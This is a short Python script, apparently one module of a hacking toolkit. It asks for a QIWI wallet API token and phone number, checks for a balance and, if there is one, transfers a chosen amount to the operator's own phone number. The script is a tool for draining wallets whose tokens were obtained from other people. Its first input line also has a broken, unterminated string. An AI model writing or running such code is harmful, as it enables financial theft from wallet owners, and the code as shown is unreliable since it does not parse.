#!/usr/bin/env python3

from core.colors import *
from SimpleQIWI import *
from core.modules import *
import time
import random

def viv():
	try:
		tok  = input(B+"\n[cbf]"+W+" Enter token: ) 
		pho  = input(B+"[cbf]"+W+" Enter phone: ")
		pho2 = input(B+"[cbf]"+W+" Enter your phone: ")
		com = input(B+"[cbf]"+W+" Enter comment: ")
		amou = int(input(B+"[cbf]"+W+" Enter amount: "))
		api  = QApi(token=tok, phone=pho)
			
		if api.balance != 0 and pho != pho2:
			try:
				print(G+"[+]"+W+" Balance Detect")
				print(G+"[+]"+W+" Balance =", api.balance)
				api.pay(account=pho2, amount=amou, comment=com)
				print(G+"[+]"+W+" Balance =", api.balance)
				time.sleep(7)
			except:
				print(R+"[err]"+W+" Balance found but unable to send money")
				time.sleep(7)
		elif api.balance !=0 and pho == pho2:
			print(R+"[err]"+W+" You can not transfer money from your account to yourself")
			time.sleep(7)
	except:
		print(R+"[err]"+W+" Unable to send money")
		time.sleep(7)
		pass
		
